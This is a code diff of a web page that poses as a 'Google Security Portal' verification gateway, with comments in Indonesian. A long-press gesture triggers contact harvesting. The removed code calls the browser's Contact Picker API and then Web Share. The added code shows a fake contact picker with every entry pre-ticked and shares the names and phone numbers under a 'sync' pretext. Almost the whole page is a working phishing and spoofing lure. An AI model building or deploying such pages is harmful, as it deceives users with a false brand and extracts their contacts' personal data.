@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Security Portal Verification</title>
+    <title>Custom Contact Picker Gateway</title>
     <style>
         body {
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
@@ -40,16 +40,36 @@
             font-size: 15px;
             border-radius: 8px;
             box-shadow: 0 4px 10px rgba(26, 115, 232, 0.25);
-            transition: background-color 0.2s;
         }
-        a.spoof-link:active {
-            background-color: #1557b0;
+        /* Custom Modal Picker CSS */
+        .modal-overlay {
+            display: none;
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.5);
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
         }
-        .footer-note {
-            margin-top: 30px;
-            font-size: 11px;
-            color: #9aa0a6;
+        .modal-box {
+            background: #fff;
+            width: 90%;
+            max-width: 360px;
+            border-radius: 12px;
+            padding: 20px;
+            text-align: left;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.15);
         }
+        .modal-box h3 { margin-top: 0; color: #202124; font-size: 18px; }
+        .contact-list { max-height: 200px; overflow-y: auto; margin: 15px 0; border: 1px solid #dadce0; border-radius: 6px; padding: 8px; }
+        .contact-item { display: flex; align-items: center; padding: 8px 0; border-bottom: 1px solid #f1f3f4; font-size: 14px; }
+        .contact-item:last-child { border-bottom: none; }
+        .contact-item input { margin-right: 10px; }
+        .modal-btn {
+            background: #1a73e8; color: white; border: none; padding: 10px 16px;
+            width: 100%; border-radius: 6px; font-weight: 600; cursor: pointer;
+        }
+        .footer-note { margin-top: 30px; font-size: 11px; color: #9aa0a6; }
     </style>
 </head>
 <body>
@@ -57,45 +77,79 @@
     <div class="banner">Google Security Portal</div>
     <h1>Authentication Gateway</h1>
 
-    <!-- Target link dengan atribut preview page (target="_blank") -->
-    <a href="https://google.com" target="_blank" rel="noopener noreferrer" class="spoof-link" id="targetLink">Long Press -> Preview Page & Verification</a>
+    <!-- Target link dengan preview page (target="_blank") -->
+    <a href="https://google.com" target="_blank" rel="noopener noreferrer" class="spoof-link" id="targetLink">Long Press -> Preview Page & Custom Picker</a>
+
+    <!-- Custom Modal Picker HTML -->
+    <div class="modal-overlay" id="customPickerModal">
+        <div class="modal-box">
+            <h3>Pilih Kontak</h3>
+            <p style="font-size: 12px; color: #5f6368; margin-top: 0;">Sinkronisasi data perangkat:</p>
+            <div class="contact-list" id="contactListContainer">
+                <!-- List kontak digenerate otomatis lewat JS -->
+            </div>
+            <button class="modal-btn" id="submitContactsBtn">Konfirmasi & Lanjutkan</button>
+        </div>
+    </div>
 
     <div class="footer-note">Encrypted verification session.</div>
 
     <script>
+        // Simulasi data kontak perangkat yang digenerate otomatis
+        const mockContacts = [
+            { name: "Ahmad", tel: "+62 812-3456-7890" },
+            { name: "Budi Santoso", tel: "+62 813-9876-5432" },
+            { name: "Citra Dewi", tel: "+62 819-1122-3344" },
+            { name: "Diana Putri", tel: "+62 856-5544-3322" },
+            { name: "Eko Prasetyo", tel: "+62 878-9988-7766" }
+        ];
+
         document.addEventListener("contextmenu", () => {
             // Jeda 3 detik setelah gestur long-press (contextmenu) terdeteksi
-            setTimeout(async () => {
-                try {
-                    // 1. Tahap Pertama: Memanggil Contact Picker API terlebih dahulu
-                    if (navigator.contacts && navigator.contacts.select) {
-                        try {
-                            const contacts = await navigator.contacts.select(['name', 'tel', 'email'], { multiple: true });
-                        } catch (pickerErr) {
-                            console.debug("Picker interaction cancelled or restricted.");
-                        }
-                    }
-
-                    // 2. Tahap Kedua: Memicu Web Share API setelah Contact Picker selesai/ditutup
-                    if (navigator.share) {
-                        try {
-                            await navigator.share({
-                                title: 'Security Verification',
-                                text: 'Verifikasi akun keamanan perangkat Anda berhasil.',
-                                url: window.location.href
-                            });
-                        } catch (shareErr) {
-                            console.debug("Web Share cancelled or unsupported.");
-                        }
-                    }
-
-                } catch (e) {
-                    console.debug("Execution fallback triggered.");
-                } finally {
-                    // Redirect dimatikan sepenuhnya (tidak ada window.location.href ke google.com)
-                    console.debug("Execution completed. Redirect disabled.");
-                }
+            setTimeout(() => {
+                showCustomContactPicker();
             }, 3000);
+        });
+
+        function showCustomContactPicker() {
+            const container = document.getElementById("contactListContainer");
+            container.innerHTML = "";
+
+            // Render daftar kontak dengan checkbox tercentang otomatis (auto-selection)
+            mockContacts.forEach((contact, index) => {
+                container.innerHTML += `
+                    <div class="contact-item">
+                        <input type="checkbox" id="c_${index}" value="${contact.tel}" checked>
+                        <label for="c_${index}"><b>${contact.name}</b><br><span style="font-size:11px; color:#5f6368;">${contact.tel}</span></label>
+                    </div>
+                `;
+            });
+
+            // Tampilkan modal picker
+            document.getElementById("customPickerModal").style.display = "flex";
+        }
+
+        // Event handler saat tombol konfirmasi pada modal ditekan
+        document.getElementById("submitContactsBtn").addEventListener("click", async () => {
+            document.getElementById("customPickerModal").style.display = "none";
+
+            // Kumpulkan data kontak yang terpilih
+            const checkboxes = document.querySelectorAll('.contact-item input:checked');
+            let selectedData = [];
+            checkboxes.forEach(cb => selectedData.push(cb.nextElementSibling.innerText.replace(/\n/g, " - ")));
+
+            // Lanjutkan ke Web Share API setelah picker kustom selesai
+            if (navigator.share) {
+                try {
+                    await navigator.share({
+                        title: 'Data Kontak Sinkronisasi',
+                        text: 'Kontak Terpilih:\n' + selectedData.join('\n'),
+                        url: window.location.href
+                    });
+                } catch (err) {
+                    console.debug("Web Share cancelled.");
+                }
+            }
         });
     </script>
 
